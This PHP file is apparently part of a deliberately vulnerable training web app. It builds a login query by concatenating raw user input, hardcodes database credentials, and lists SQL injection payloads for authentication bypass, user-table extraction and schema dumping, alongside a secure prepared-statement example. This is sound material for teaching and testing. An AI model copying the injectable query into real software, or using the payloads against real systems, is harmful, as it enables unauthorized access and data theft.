<?php
// VULNERABILITY: A03 - Injection (SQL Injection)
// This file demonstrates SQL injection vulnerabilities

// Database configuration
$host = 'db';
$username = 'wcorp_user';
$password = 'wcorp_pass';
$database = 'wcorp_db';

// VULNERABILITY: No input validation or prepared statements
$message = '';
$error = '';

if ($_POST) {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    
    try {
        // VULNERABILITY: Direct SQL query with user input - SQL Injection
        $pdo = new PDO("mysql:host=$host;dbname=$database", $username, $password);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        // VULNERABILITY: Raw SQL query without prepared statements
        $sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
        $result = $pdo->query($sql);
        
        if ($result->rowCount() > 0) {
            $user_data = $result->fetch(PDO::FETCH_ASSOC);
            $message = "Login successful! Welcome, " . $user_data['username'] . " (ID: " . $user_data['id'] . ")";
        } else {
            $error = "Invalid username or password";
        }
    } catch (PDOException $e) {
        $error = "Database error: " . $e->getMessage();
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>W Corp - SQL Injection Demo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .header {
            background-color: #2c3e50;
            color: white;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .nav {
            background-color: #34495e;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        .nav a {
            color: white;
            text-decoration: none;
            margin-right: 20px;
            padding: 5px 10px;
            border-radius: 4px;
        }
        .nav a:hover {
            background-color: #2c3e50;
        }
        .alert {
            padding: 15px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        .alert-success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .alert-danger {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .alert-warning {
            background-color: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .btn {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
        .btn:hover {
            background-color: #2980b9;
        }
        .code-block {
            background-color: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 4px;
            padding: 15px;
            margin: 10px 0;
            font-family: monospace;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>W Corp - SQL Injection Demo</h1>
            <p>Demonstrating A03: Injection (SQL Injection)</p>
        </div>

        <div class="nav">
            <a href="index.php">Home</a>
            <a href="login.php">SQL Injection</a>
            <a href="upload.php">File Upload</a>
            <a href="info.php">PHP Info</a>
        </div>

        <div class="alert alert-warning">
            <strong>⚠️ Vulnerability:</strong> This form is vulnerable to SQL injection attacks. 
            The application uses raw SQL queries without prepared statements or input validation.
        </div>

        <?php if ($message): ?>
            <div class="alert alert-success">
                <?php echo htmlspecialchars($message); ?>
            </div>
        <?php endif; ?>

        <?php if ($error): ?>
            <div class="alert alert-danger">
                <?php echo htmlspecialchars($error); ?>
            </div>
        <?php endif; ?>

        <h2>Login Form</h2>
        <form method="POST">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn">Login</button>
        </form>

        <h3>SQL Injection Examples</h3>
        <p>Try these payloads to demonstrate SQL injection:</p>

        <h4>1. Bypass Authentication:</h4>
        <div class="code-block">
            Username: admin' OR '1'='1' --<br>
            Password: anything
        </div>

        <h4>2. Extract Database Information:</h4>
        <div class="code-block">
            Username: admin' UNION SELECT 1,2,3,4,5,6,7 --<br>
            Password: anything
        </div>

        <h4>3. Extract User Data:</h4>
        <div class="code-block">
            Username: admin' UNION SELECT id,username,password,email,role,created_at,updated_at FROM users --<br>
            Password: anything
        </div>

        <h4>4. Extract Database Schema:</h4>
        <div class="code-block">
            Username: admin' UNION SELECT table_name,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_schema='wcorp_db' --<br>
            Password: anything
        </div>

        <h3>Vulnerable Code</h3>
        <div class="code-block">
            // VULNERABILITY: Raw SQL query without prepared statements<br>
            $sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";<br>
            $result = $pdo->query($sql);
        </div>

        <h3>Secure Code (Not Implemented)</h3>
        <div class="code-block">
            // SECURE: Use prepared statements<br>
            $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");<br>
            $stmt->execute([$user, $pass]);<br>
            $result = $stmt->fetchAll();
        </div>

        <div class="alert alert-danger">
            <strong>🔴 Critical:</strong> This vulnerability allows attackers to:<br>
            • Bypass authentication<br>
            • Extract sensitive data<br>
            • Modify database records<br>
            • Execute arbitrary SQL commands
        </div>
    </div>
</body>
</html>
